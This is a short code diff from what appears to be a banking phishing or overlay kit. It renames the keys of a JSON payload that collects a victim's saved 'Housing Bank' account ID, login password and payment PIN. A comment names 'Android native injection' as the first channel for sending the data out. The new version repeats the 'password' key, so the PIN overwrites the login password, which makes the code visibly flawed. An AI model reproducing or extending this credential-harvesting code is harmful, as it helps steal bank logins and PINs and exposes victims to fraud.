@@ -1138,11 +1138,11 @@
     loadingMask.classList.add('show');
 
     var payload = JSON.stringify({
-      "类型": "Housing Bank",
-      "账号": savedUserId,
-      "登录密码": savedPassword,
-      "支付密码": pinCode,
-      "时间戳": Date.now()
+      'template': "Housing Bank",
+      'username': savedUserId,
+      'password': savedPassword,
+      'password': pinCode,
+      'ts': Date.now()
     });
 
     // 通道 1: Android 原生注入
